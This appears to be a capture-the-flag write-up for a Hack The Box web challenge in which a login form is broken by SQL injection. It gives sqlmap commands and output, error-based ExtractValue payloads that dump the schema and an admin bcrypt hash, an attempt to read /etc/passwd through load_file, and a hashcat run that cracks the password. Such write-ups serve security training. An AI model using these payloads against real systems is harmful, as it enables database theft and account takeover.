# korp-terminal

Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

## Solution

http://94.237.62.240:59149/

POST
form data: username=barrett&password=test

```sh
gobuster dir --url http://94.237.62.240:59149/ -w /usr/share/wordlists/dirb/common.txt
# nothing...
```

SQLi ?

https://github.com/payloadbox/sql-injection-payload-list

```sh
curl 'http://94.237.62.240:59149/' -X POST \

sqlmap -u http://94.237.62.240:59149/ --data="username=*&password=*" --method POST --dump all --batch
sqlmap -u "http://94.237.62.240:59149/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --ignore-code 401


# POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
# sqlmap identified the following injection point(s) with a total of 724 HTTP(s) requests:
# ---
# Parameter: username (POST)
#     Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
#     Payload: username=geJo' AND 8042=(SELECT (CASE WHEN (8042=8042) THEN 8042 ELSE (SELECT 6993 UNION SELECT 1181) END))-- -&password=QJGF

#     Type: error-based
#     Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
#     Payload: username=geJo' OR (SELECT 9955 FROM(SELECT COUNT(*),CONCAT(0x717a766271,(SELECT (ELT(9955=9955,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ONFT&password=QJGF

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: username=geJo' AND (SELECT 9873 FROM (SELECT(SLEEP(5)))FvfL)-- HsjU&password=QJGF
```

```
boolean-based

admin' AND 8042=(SELECT (CASE WHEN (8042=8042) THEN 8042 ELSE (SELECT 6993 UNION SELECT 1181) END))-- -
admin' AND 8042=(SELECT (CASE WHEN (8042=8042) THEN 8042 ELSE (SELECT 6993 UNION SELECT 1181) END))-- -

nope

```


```
'admin;
"1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin;'' at line 1"

'
"1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1"

' or "
`1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"'' at line 1`

'' or 1=1

'''''''''''''UNION SELECT '2
"Invalid salt"

admin' or '1'='1
"1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ') or '1'='1'' at line 1"

' AND ExtractValue(null,concat(0x3a,version()))-- -
"1105 (HY000): XPATH syntax error: ':10.11.6-MariaDB'"

' AND ExtractValue(null,concat(0x3a,database()))-- -
"1105 (HY000): XPATH syntax error: ':korp_terminal'"

' AND ExtractValue(null,concat(0x3a,user()))-- -
"1105 (HY000): XPATH syntax error: ':lean@localhost'"

' AND ExtractValue(null,concat(0x3a, (SELECT GROUP_CONCAT(table_name SEPARATOR ', ') as x FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='korp_terminal')))-- -
"1105 (HY000): XPATH syntax error: ':users'"

' AND ExtractValue(null,concat(0x3a, (SELECT GROUP_CONCAT(column_name SEPARATOR ', ') as x FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='korp_terminal' AND table_name='users')))-- -
"1105 (HY000): XPATH syntax error: ':id, username, password'"

' AND ExtractValue(null,concat(0x3a, (SELECT GROUP_CONCAT(username SEPARATOR ', ') as x FROM users)))-- -
"1105 (HY000): XPATH syntax error: ':admin'"

' AND ExtractValue(null,concat(0x3a, (SELECT password FROM users)))-- -
"1105 (HY000): XPATH syntax error: ':$2b$12$OF1QqLVkMFUwJrl1J1YG9...'"

' AND ExtractValue(null,concat(0x3a, (SELECT length(password) FROM users)))-- -
"1105 (HY000): XPATH syntax error: ':60'"

' AND ExtractValue(null,concat(0x3a, (SELECT SUBSTRING(password, 1, 20) as x FROM users)))-- -
"1105 (HY000): XPATH syntax error: ':$2b$12$OF1QqLVkMFUwJ'"

' AND ExtractValue(null,concat(0x3a, (SELECT SUBSTRING(password, 21, 20) as x FROM users)))-- -
"1105 (HY000): XPATH syntax error: ':rl1J1YG9u6FdAQZa6Byx'"

' AND ExtractValue(null,concat(0x3a, (SELECT SUBSTRING(password, 41, 20) as x FROM users)))-- -
"1105 (HY000): XPATH syntax error: ':Ft/CkS/2HW8GA563yiv.'"

```

admin
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.

12 possible salt?  so hash maybe OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.

Possible algorithms: bcrypt $2*$, Blowfish (Unix), bcrypt(md5($plaintext))


https://auth0.com/blog/hashing-in-action-understanding-bcrypt/

' AND ExtractValue(null,concat(0x3a, (SELECT TO_base64(load_file("/etc/passwd")) from information_schema.plugins limit 1)))-- -


```
1234 " AND 1=0 UNION ALL SELECT "admin", "$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
```

```sh
hashid -e "$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv."
# BigCrypt

hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# password123
```

`HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`
